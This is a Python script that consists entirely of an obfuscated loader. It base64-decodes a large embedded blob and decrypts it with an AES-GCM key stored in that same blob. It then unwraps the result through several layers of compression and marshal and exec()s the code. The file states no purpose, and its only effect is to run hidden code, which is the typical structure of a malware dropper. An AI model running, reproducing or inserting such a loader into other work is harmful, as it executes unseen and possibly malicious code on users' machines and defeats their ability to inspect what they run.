
import base64, zlib, gzip, lzma, marshal, sys
from Crypto.Cipher import AES

KEY_LEN = 32
NONCE_LEN = 16
TAG_LEN = 16

def multi_decompress(data: bytes):
    lzmaed = zlib.decompress(data)
    gzipped = lzma.decompress(lzmaed)
    marshaled = gzip.decompress(gzipped)
    code = marshal.loads(marshaled)
    return code

def coophalco():
    try:
        b64_data = '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'
        payload = base64.b64decode(b64_data)
        pos = 0
        key = payload[pos:pos+KEY_LEN]; pos += KEY_LEN
        nonce = payload[pos:pos+NONCE_LEN]; pos += NONCE_LEN
        tag = payload[pos:pos+TAG_LEN]; pos += TAG_LEN
        ciphertext = payload[pos:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        code = multi_decompress(decrypted)
        exec(code, globals())
    except Exception as e:
        print(f"Error: {type(e).__name__}: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    coophalco()
